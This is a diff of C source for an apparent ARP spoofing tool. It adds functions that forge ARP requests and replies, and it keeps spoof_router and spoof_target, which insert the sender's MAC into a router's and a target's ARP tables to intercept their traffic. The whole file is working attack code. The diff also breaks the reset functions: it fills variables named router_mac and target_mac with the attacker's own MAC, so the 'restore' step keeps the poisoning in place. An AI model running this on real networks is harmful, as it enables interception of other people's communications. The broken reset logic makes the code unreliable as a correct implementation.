@@ -9,8 +9,9 @@
 # include <net/if.h>
 # include <arpa/inet.h>
 
-# include <string.h>
+# include <string.h> // debug
 # include <errno.h>
+# include <unistd.h>//write debug
 
 static void* getipfromstr(const char* strip)
 {
@@ -25,7 +26,7 @@ static void* getipfromstr(const char* strip)
     return dest;
 }
 
-static void* getmacfromstr(const char* strmac)
+void* getmacfromstr(const char* strmac)
 {
     static uint8_t dest[SIZEOFMAC];
 
@@ -64,10 +65,10 @@ static err_t send_arp(int fd, const struct ether_arp *earp,
     ft_memcpy(eth->h_source, src_mac, SIZEOFMAC);
     ft_memcpy(eth->h_dest, dest_mac, SIZEOFMAC);
 
-    // printf("[DEBUG] src mac: ");
-    // PRINT_MAC(eth->h_source, false);
-    // printf(" dest mac: ");
-    // PRINT_MAC(eth->h_dest, true);
+    printf("[DEBUG] src mac: ");
+    PRINT_MAC(eth->h_source, false);
+    printf(" dest mac: ");
+    PRINT_MAC(eth->h_dest, true);
 
     struct ether_arp *earp_buffptr = (struct ether_arp *)(buff + sizeof(*eth));
     *earp_buffptr = *earp;
@@ -103,25 +104,6 @@ err_t send_arp_request_to_target(const proginfo_t *const info)
     getmacfromstr(info->mymachine.mac), ETHER_BROADCAST_MAC, true);
 }
 
-/// Send standart ARP Request to the router, the router should reply.
-err_t send_arp_request_to_router(const proginfo_t *const info)
-{
-    struct ether_arp earp = (struct ether_arp){
-        .arp_hrd = htons(HARWARE_TYPE),
-        .arp_pro = htons(ETH_P_IP),
-        .arp_hln = SIZEOFMAC,
-        .arp_pln = SIZEOFIP,
-        .arp_op = htons(ARP_REQUEST),
-    };
-
-    ft_memcpy(earp.arp_sha, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
-    ft_memcpy(earp.arp_spa, getipfromstr(info->mymachine.ip), SIZEOFIP);
-    ft_memcpy(earp.arp_tpa, getipfromstr(info->router.ip), SIZEOFIP);
-
-    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
-    getmacfromstr(info->mymachine.mac), ETHER_BROADCAST_MAC, true);
-}
-
 /// Send standart ARP Reply to target
 err_t send_arp_reply_to_target(const proginfo_t *const info)
 {
@@ -138,8 +120,49 @@ err_t send_arp_reply_to_target(const proginfo_t *const info)
     ft_memcpy(earp.arp_tha, getmacfromstr(info->target.mac), SIZEOFMAC);
     ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);
 
+    uint8_t mymachine_mac[SIZEOFMAC];
+    ft_memcpy(mymachine_mac, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+
     return send_arp(info->sockarp, (const struct ether_arp *)&earp,
-    getmacfromstr(info->mymachine.mac), getmacfromstr(info->target.mac), false);
+    mymachine_mac, getmacfromstr(info->target.mac), false);
+}
+
+/// Send ARP Request to the router, containing the target's IP.
+err_t send_request_before_spoof_router(const proginfo_t *const info)
+{
+    struct ether_arp earp = (struct ether_arp){
+        .arp_hrd = htons(HARWARE_TYPE),
+        .arp_pro = htons(ETH_P_IP),
+        .arp_hln = SIZEOFMAC,
+        .arp_pln = SIZEOFIP,
+        .arp_op = htons(ARP_REQUEST),
+    };
+
+    ft_memcpy(earp.arp_sha, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+    ft_memcpy(earp.arp_spa, getipfromstr(info->target.ip), SIZEOFIP);
+    ft_memcpy(earp.arp_tpa, getipfromstr(info->router.ip), SIZEOFIP);
+
+    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
+    getmacfromstr(info->mymachine.mac), ETHER_BROADCAST_MAC, true);
+}
+
+/// Send ARP Request to the target, containing the router's IP.
+err_t send_request_before_spoof_target(const proginfo_t *const info)
+{
+    struct ether_arp earp = (struct ether_arp){
+        .arp_hrd = htons(HARWARE_TYPE),
+        .arp_pro = htons(ETH_P_IP),
+        .arp_hln = SIZEOFMAC,
+        .arp_pln = SIZEOFIP,
+        .arp_op = htons(ARP_REQUEST),
+    };
+
+    ft_memcpy(earp.arp_sha, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+    ft_memcpy(earp.arp_spa, getipfromstr(info->router.ip), SIZEOFIP);
+    ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);
+
+    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
+    getmacfromstr(info->mymachine.mac), ETHER_BROADCAST_MAC, true);
 }
 
 /// Spoof my MAC address into router's ARP table at target's ip index.
@@ -158,8 +181,11 @@ err_t spoof_router(const proginfo_t *const info)
     ft_memcpy(earp.arp_tha, getmacfromstr(info->router.mac), SIZEOFMAC);
     ft_memcpy(earp.arp_tpa, getipfromstr(info->router.ip), SIZEOFIP);
 
+    uint8_t mymachine_mac[SIZEOFMAC];
+    ft_memcpy(mymachine_mac, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+
     return send_arp(info->sockarp, (const struct ether_arp *)&earp,
-    getmacfromstr(info->mymachine.mac), getmacfromstr(info->target.mac), false);
+    mymachine_mac, getmacfromstr(info->target.mac), false);
 }
 
 /// Spoof my MAC address into target's ARP table at router's ip index.
@@ -178,8 +204,11 @@ err_t spoof_target(const proginfo_t *const info)
     ft_memcpy(earp.arp_tha, getmacfromstr(info->target.mac), SIZEOFMAC);
     ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);
 
+    uint8_t mymachine_mac[SIZEOFMAC];
+    ft_memcpy(mymachine_mac, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+
     return send_arp(info->sockarp, (const struct ether_arp *)&earp,
-    getmacfromstr(info->mymachine.mac), getmacfromstr(info->router.mac), false);
+    mymachine_mac, getmacfromstr(info->router.mac), false);
 }
 
 /// Remove my spoofed MAC address from target's ARP table (at router's ip index)
@@ -198,8 +227,11 @@ err_t reset_arp_target(const proginfo_t *const info)
     ft_memcpy(earp.arp_tha, getmacfromstr(info->target.mac), SIZEOFMAC);
     ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);
 
+    uint8_t router_mac[SIZEOFMAC];
+    ft_memcpy(router_mac, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+
     return send_arp(info->sockarp, (const struct ether_arp *)&earp,
-    getmacfromstr(info->router.mac), getmacfromstr(info->target.mac), false);
+    router_mac, getmacfromstr(info->target.mac), false);
 }
 
 /// Remove my spoofed MAC address from router's ARP table (at target's ip index)
@@ -218,6 +250,9 @@ err_t reset_arp_router(const proginfo_t *const info)
     ft_memcpy(earp.arp_tha, getmacfromstr(info->router.mac), SIZEOFMAC);
     ft_memcpy(earp.arp_tpa, getipfromstr(info->router.ip), SIZEOFIP);
 
+    uint8_t target_mac[SIZEOFMAC];
+    ft_memcpy(target_mac, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+
     return send_arp(info->sockarp, (const struct ether_arp *)&earp,
-    getmacfromstr(info->target.mac), getmacfromstr(info->target.mac), false);
+    target_mac, getmacfromstr(info->router.mac), false);
 }
